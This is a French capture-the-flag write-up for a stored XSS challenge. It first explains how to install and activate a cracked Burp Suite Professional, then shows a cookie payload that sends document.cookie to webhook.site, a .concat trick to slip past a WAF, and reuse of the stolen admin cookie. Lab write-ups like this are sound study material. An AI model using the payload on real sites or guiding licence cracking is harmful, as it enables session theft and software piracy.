	
Pour ce challenge j'ai au préalable cracker Burpsuite Pro qui vous seras très utils et je vais vous expliquez pas à pas comment l'installer et comment je suis arrivé à ce résultat. 

Tout d'abord rendez vous sur ce github : 
https://github.com/xiv3r/Burpsuite-Professional

Par la suite si vous êtes sur Linux ou MacOS je vous invite à suivre les démarches qui sont sur le github et sinon je vous invite à suivre ce que je vais dire attentivement. 

Pour windows : 

Tout d'abord aller dans votre disque C, et créer un Dossier Burp : 




![[Pasted image 20260228115516.png]]


Ensuite dès lors que vous avez fais cela nous allons installer le [install.ps1](https://github.com/xiv3r/Burpsuite-Professional/blob/main/install.ps1 "install.ps1")
Cliquez sur le lien cela vous installera directement. 

Allez dans vos téléchargement et vous allez extraire le fichier : 

![[Pasted image 20260228115718.png]]
Directement dans le fichier Burp que vous venez de créé dans le chemin suivant qui est censé être : C:\Burp 
Si vous avez bien fais évidemment. 

Maintenant vous allez lancer votre powershell en mode admin et vous allez taper les commandes suivante. 

- ```
    Set-ExecutionPolicy -ExecutionPolicy bypass -Scope process
    ```

Répondez oui à la question et par la suite si vous obtenez des questions répondez Oui. 

Allez dans votre répertoire via la commande : cd C:\Burp 

Et installer le fichier .ps1 qu'on à installer juste auparavant grâce à
./install.ps1 

Répondez oui, normalement il vont vous faire installer une version de java n'ayez pas peur et faite le sinon l'application ne pourra pas ce lancer. 

Pour la licence Key ce n'est pas trop expliquez dans le github mais je vais vous guidez car moi aussi j'ai galérer. 

Lorsque vous avez fini l'installation c'est censé vous lancer une application avec une licence key lorsque vous allez lancer votre burpsuite (une seule fois ne vous en faites pas les prochaines fois vous n'en n'aurait pas besoin) Vous allez mettre la licence key qui est afficher sur l'application avec marquer "licence key" puis vous allez coller sur Burpsuite le texte et cliquez sur Next.

Par la suite cliquez en bas sur "manual activation". Vous allez voir trois champs copier celui avec le mot "request" et copier le sur votre application de licence crack. Et vous allez voir apparaître une licence "response" en bas copier le et mettez dans le même champs sur burpsuite, le champ response. 

Cliquez sur next. 

Et voilà vous avez votre burpsuite de prêt et vous pouvez utilisez toute les fonctionnalité sauf l'ia de burp. 

Maintenant que vous avez tout cela attaquons le challenge. 


Premièrement prenons conscience de l'énoncer : 
![[Pasted image 20260228121121.png]]

Maintenant que vous savez qu'il faudra voler les cookies administrateur et ce connecter au panel admin je suppose que vous avez déjà une idée de XSS à faire vu tout les challenges XSS que nous avons déjà fait juste auparavant. 

Bon pour nous aider nous allons utiliser notre Burpsuite Pro mais testons quand même de voir comment cela peut marcher. 

Cliquez sur Démarrer le challenge et c'est partie.

Nous arrivons sur une page qui ressemble à cela : 
![[Pasted image 20260228121310.png]]

Un site de discussion tout à fait banal (qui se fait vieux haha vu qu'on à maintenant instagram etc... Mais bref )

Donc prenons conscience de l'environnement. 

Nous avons un champ titre qui va nous permettre de rentrer le titre de notre message comme un e-mail on va dire. 

Et notre message / le contenu. 

testons tout d'abord de voir le code javascript qui va nous être renvoyez lorsqu'on tape comme titre : test et message : test.

Pour cela rendez vous sur Burpsuite dans l'onglet Proxy.

![[Pasted image 20260228121807.png]]

Cliquez sur open browser. 

Copier le lien de votre site vous allez atterrir sur la même pas que toute à l'heure : 

Retournez sur burpsuite et activer l'option Intercept off, il est censer devenir intercept on. 

![[Pasted image 20260228122207.png]]

Maintenant retournez dans votre site sur le navigateur Chromonium de Burpsuite et taper votre test : 

![[Pasted image 20260228122243.png]]

Vous devez appercevoir une requête POST qui à été effectuer et que la requête ressemble à cela : 
![[Pasted image 20260228122422.png]]

Okay maintenant les choses sérieuse vont commencer. Cliquez sur la requête POST et faites CTRL + R, ou clique Droit => Send to repeater.

Allez dans l'onglet Repeater vous devez avoir cela : 

![[Pasted image 20260228122601.png]]

Bon voyons voir maintenant la réponse cliquez sur Send en haut à gauche. 

![[Pasted image 20260228122632.png]]

Okay nous avons un code HTTP 200 ce qui veut dire que le serveur à bien traiter notre requête. 

Maintenant regardons le rendu allez dans Render en haut à droite. 

![[Pasted image 20260228122722.png|408]]
Nous voyons que notre message à été publiez et que nous avons le statut d'inviter nous ne somme pas encore Administrateur. Voyons voir le code HTML qui nous à été renvoyez lors de cette requête.

Je vous invite à descendre jusqu'à voir votre message dans le script de la Response : 

![[Pasted image 20260228144231.png]]

On voit que notre statut et notre texte sont au tour d'une balise span, notre texte est dans une balise "b" mais aussi dans une balise "span" juste en dessous. 

Mais où est réellement la faille ? On peut surement deviner que ce sera dans la balise "i" qui contient une classe "invite" qui ressemble beaucoup à notre cookie : status=invite. C'est pour cela que je vous invite à utiliser nos nouvelles options grâce au Burpsuite Pro qui est le scan en direct.

Nous savons que le site contient une faille XSS stocké on va donc trier le scan qu'avec des failles XSS pour gagner du temps et ne pas faire trop de requête au serveur. 

![[Pasted image 20260228144836.png]]

Rendez-vous dans l'onglet Dashboard et cliquez sur New scan. 

![[Pasted image 20260228144912.png]]

Ici nous voulons de préférence qu'un audit soit générer pour comprendre comment on va pouvoir exploiter la faille XSS stocker et comment cela fonctionne. Cliquez sur Crawl and audit.

![[Pasted image 20260228145007.png]]

Puisque nous avons un crack du compte d'un gars il à fait exprès de ne pas laisser l'option AI puisque des Credits sont utiliser lors de l'utilisation de L'IA et ceci peut lui coûter cher donc ça ne sert à rien de mettre "BAC false positive reduction".

Cliquez sur scan en bas à droite : 


![[Pasted image 20260228145355.png]]

Cliquez sur Custom puisque nous allons filtrer les failles que nous voulons scanner. Par défaut il va tout cocher. Mais ne vous en faite pas cliquez sur Custom.

![[Pasted image 20260228145612.png]]

Cliquez deux fois sur le boutons comme sur le screen qui est censé être en bleu chez vous. Cela va tout décocher par la suite dans "Search" taper "Cross" et vous allez avoir toute les options. 

![[Pasted image 20260228150003.png]]

Re-cliquez sur name et tout sera selectionner. Ne vous enfaites pas il prend que les options qui contient le nom que vous avez mis. Cliquez sur "Scan": 

Il faut maintenant mettre l'URL que nous souhaitons scanner ici le challenge c'est celui-ci : 
![[Pasted image 20260228150228.png]]

Maintenant cliquez sur scan, et laisser la magie opérer. 

On peut voir l'avancer dans le dashboard en direct. 

![[Pasted image 20260228150306.png]]


Okay fin du scan voyons le résultat : 

![[Pasted image 20260228151251.png]]

On voit que deux failles on été trouver mais une plus dangereuse que l'autre. 

On peut voir que le payload est de la forme : 
```
str"><script>alert(1)</script>str
```
Lorsqu'on lit l'audit on peut comprendre que ça permet d'injecter du code arbitraire et que le payload the trouve dans le champ cookie : status grâce à cette phrase : "nxhw"><script>alert(1)</script>i8vir" was submitted in the status cookie"
![[Pasted image 20260228151725.png]]

Allez dans Request 1 et descendais dans le Cookie : status = .... 

![[Pasted image 20260228151808.png]]

On peut voir que si vous sélectionner le payload utiliser vous pouvais voir ce qui à été utiliser juste à droite. La version encoder et l'autre qui est décoder. Maintenant nous allons exploiter la faille qui à été trouver. 

Allez dans l'onglet Repeater encore une fois et nous allons reprendre la requête test du début. 

![[Pasted image 20260228153656.png]]

Je vais vous expliquez le payload. 

On sait que le payload qui à été trouver ce trouve dans le cookie. 
On à donc juste besoin de mettre le payload qui nous à été trouver par burp qui été.

Une chaine str quelconque"><script>alert(1)</script>une autre chaine pas besoin en vrai.

Bon maintenant nous voulons le cookie donc comme dans les autres challenges que j'ai fais nous allons utiliser document.location="un site pour récupérer le query?c=" et à la fin nous allons mettre ce qu'on veut récupérer donc les cookies qui sont sous la forme document.cookie en Javascript.

Maintenant qu'on sait ça on peu combiner tout cela après notre "invite" c'est très important de garder le invite car sinon nous ne pourrons pas faire l'exploit puisqu'un des paramètres demander par le site n'est pas présent donc pas d'exécution.

on se trouve donc avec comme dans l'image. 

invite"><script>document.location="https://webhook.site/VotreID?c=".concat(document.cookie)</script>

C'est très important le ?, =.

Le ? permet de dire qu'on initie une variable dans le lien. le C c'est moi qui est choisis vous pouvez l'appeler comme vous voulez. Test, Toto,toto. Peut-importe et le "=" permet de dire qu'on va lui donner une valeur. C'est important pour la suite de notre payload.

Nous allons utiliser .concat qui est la même option que + elle permet de bypass le WAF (Web Application Firewall). Car il peut-être filtrer. Maintenant à l'intérieur on va dire qu'on va coller les cookies de la personne qui visite le site (le bot admin) avec document.cookie qui permet de récupérer les cookies en JS.

Et voilà un payload prêt à l'emploie gain de temps grâce à BurpSuite Pro et un peu de connaissance en JS et WEB. 

NB: J'utilise webhook.site pour récupérer les cookies.


Allons maintenant sur notre site Webhook.site. 

![[Pasted image 20260228154612.png]]

On voit bien qu'on à récupérer les cookies administrateur. 

Mais ce n'est pas fini rappellez-vous il faut maintenant qu'on se connecte au panel Admin du site. 

Pour cela on va faire : 
- Copier le cookie admin 
- Prendre la partie Clé
- Prendre la partie Valeur


Rendez-vous sur votre navigateur. Et maintenant allez dans : 

DevTools(CTRL+SHIFT+I) > Application > Cookie

![[Pasted image 20260228154843.png]]

Cliquez sur l'espace qui est en bas des autres cookie. Vous n'aurez pas les mêmes cookies que moi au dessus (J'était fatiguer et j'avais oublier comment importer le cookie pendant 2 sec j'ai remplacer donc le cookie status d'une mauvaise manière et j'ai fais sur mes cookies de google Analytics au cas où lorsque j'écris ce write-up pour ma sécurité.)

Bon continuons Cliquez en dessous de status  et mettez dans le champ de gauche qui représente la clé ADMIN_COOKIE et dans le champ droite la valeur qui est SY2USDIH78TF3DFU78546TE7F

Voici le résultat : 

![[Pasted image 20260228155220.png]]

Vous pouvez maintenant Refresh la page et cliquez sur le boutons admin au dessus.

FLAG : 

![[Pasted image 20260228115112.png]]

BINGO !! 
